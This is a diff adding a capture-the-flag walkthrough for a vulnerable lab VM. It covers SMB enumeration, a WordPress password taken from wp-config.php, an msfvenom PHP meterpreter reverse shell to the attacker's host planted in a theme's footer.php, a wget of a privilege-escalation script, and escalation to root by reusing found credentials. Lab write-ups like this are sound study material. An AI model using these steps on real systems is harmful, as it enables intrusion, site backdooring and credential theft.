@@ -52,3 +52,75 @@ Maybe the password is somewhere else...
 Time to check the SMB port and see if there is any relevant data to be found.
 `enum4linux -a 192.168.17.139`
 
+![Image of Enum4Linux](https://blu0.github.io/LSAWalkthrough/LSAenum4linux.png)
+
+share$ looks interesting
+connect as guest
+
+![Image of SMBClient](https://blu0.github.io/LSAWalkthrough/LSAsmbclient.png)
+
+No problem listing
+
+![Image of SMBClient2](https://blu0.github.io/LSAWalkthrough/LSAsmbclient2.png)
+
+
+Get command works, grabbed the wp-config.php file
+
+![Image of wp-config](https://blu0.github.io/LSAWalkthrough/LSAwp-config.png)
+
+
+
+The password works, now time for reverse shell
+
+`msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.17.141 LPORT=4444 -f raw > shell.php`
+
+A little touch up on the format (remove leading // and add ?> to the end), then add to footer.php of theme
+
+![Image of footer](https://blu0.github.io/LSAWalkthrough/LSAfooter.png)
+
+
+Get meterpreter ready
+
+![Image of meterpreter](https://blu0.github.io/LSAWalkthrough/LSAmeterpreter.png)
+
+
+Now type run and reload the wordpress site
+
+![Image of meterpreter2](https://blu0.github.io/LSAWalkthrough/LSAmeterpreter2.png)
+
+
+
+Shell is successful, getting some system info.
+Tried the same password for root, but not working
+Moved to /tmp and wget from my attack machine the linuxprivchecker.py script. Ran it, but found nothing obvious. Let’s poke around with what we already have and come back to it.
+Maybe there is another user in the database
+
+![Image of mysql](https://blu0.github.io/LSAWalkthrough/LSAmysql.png)
+
+![Image of mysql2](https://blu0.github.io/LSAWalkthrough/LSAmysql2.png)
+
+![Image of mysql3](https://blu0.github.io/LSAWalkthrough/LSAmysql3.png)
+
+Nope, no other users
+What other users are on the system?
+
+![Image of passwd](https://blu0.github.io/LSAWalkthrough/LSApasswd.png)
+
+
+Tried swiching to togie with the same password, no go.
+Did I overlook something?
+Yes, went back to the SMB share and grabbed deets.txt
+
+![Image of deets](https://blu0.github.io/LSAWalkthrough/LSAdeets.png)
+
+![Image of su](https://blu0.github.io/LSAWalkthrough/LSAsu.png)
+
+
+Was able to switch to togie with the password, and see the user is in the sudo group
+
+![Image of shadow](https://blu0.github.io/LSAWalkthrough/LSAshadow.png)
+
+![Image of root](https://blu0.github.io/LSAWalkthrough/LSAroot.png)
+
+
+Proof.txt found, plus I have the root password hash if I want to crack it later
